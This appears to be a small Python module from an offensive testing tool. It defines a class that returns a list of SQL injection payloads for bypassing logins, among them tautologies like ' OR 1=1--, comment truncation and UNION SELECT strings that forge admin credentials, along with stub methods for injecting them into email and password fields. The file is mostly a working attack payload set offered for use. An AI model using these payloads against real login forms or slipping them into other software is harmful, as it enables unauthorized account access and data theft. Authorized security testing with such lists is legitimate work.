"""
SQL Injection Authentication Bypass
"""

from typing import List

class SQLiBypass:
    @staticmethod
    def get_payloads() -> List[str]:
        """Return common SQLi authentication bypass payloads"""
        return [
            "admin' OR '1'='1' --",
            "admin' OR '1'='1' #",
            "admin'--",
            "admin' #",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR '1'='1'--",
            "') OR ('1'='1'--",
            "admin' OR 'a'='a",
            "' UNION SELECT NULL, NULL--",
            "admin' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
        ]
    
    @staticmethod
    def inject_email(email: str, payload: str) -> str:
        """Inject SQLi payload into email field"""
        return payload
    
    @staticmethod
    def inject_password(password: str, payload: str) -> str:
        """Inject SQLi payload into password field"""
        return payload
